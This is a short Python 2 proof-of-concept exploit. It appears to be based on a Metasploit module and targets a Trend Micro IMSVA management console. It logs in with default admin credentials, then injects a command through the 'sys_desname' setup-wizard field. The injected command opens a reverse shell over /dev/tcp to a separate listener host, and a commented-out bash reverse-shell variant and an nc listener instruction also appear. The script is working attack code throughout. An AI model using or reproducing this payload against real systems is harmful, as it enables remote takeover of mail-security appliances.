#!/usr/bin/env python
# poc based on http://code610.blogspot.com/2017/08/metasploit-module-for-rce-in-trend.html
# 25.08.2018
#
import requests, sys
from urllib import urlencode
import os

target = 'https://192.168.56.34:8445'
print '[+] target:', target

# remember to set nc -lvvp 4444 on 2nd terminal

s = requests.Session()
s.verify=False

login_url = target + '/login.imss'
login_data = {
  'userid':'admin',
  'pwdfake':'imsva'.encode('base64')
}

resp = s.post(login_url, data=login_data)

#token_place = resp.text.find(';jsessionid=') + 13
#token = resp.text[token_place:token_place + 32]


auth_cookie = resp.history[0].cookies.get('JSESSIONID')
print '[+] logged-in cookie:', auth_cookie
#print resp.text


myreq = s.get(target + '/WizardSetting_sys.imss?direct=next')
testresp = myreq.text

print '[+] test GET:',myreq.status_code

#
cookies = {'JSESSIONID': auth_cookie}
headers = {'Referer':'https://192.168.56.34:8445/WizardSetting_0.imss?direct=next' }
#payload = "AA'; bash -i >& /dev/tcp/192.168.56.106/4444 0>&1 ;#"
payload = "AA'; 0<&196;exec 196<>/dev/tcp/192.168.56.106/4444; sh <&196 >&196 2>&196 ;#"
myreq_data = {
       'time_distance' : '0',
          'sys_ipv4_addr_eth0' : '192.168.56.34',
          'sys_ipv4_mask_eth0' : '255.255.255.0',
          'sys_desname': payload ,
          'sys_hostname' : 'trend.me',
          'sys_ipv4_gateway' : '192.168.56.1',
          'sys_ipv4_pri_dns' : '192.168.56.1',
          'sys_ipv4_sec_dns' : '',
          'sys_tz_cont' : 'America',
          'sys_tz_regn' : 'United+States',
          'sys_tz_city' : 'New_York',

}
#myreq_data = urlencode(myreq_data)

myreq = s.post(target + '/WizardSetting_sys.imss?direct=next', data=myreq_data, headers=headers, cookies=cookies) # ,allow_redirects=True)

print myreq_data
#print myreq.text
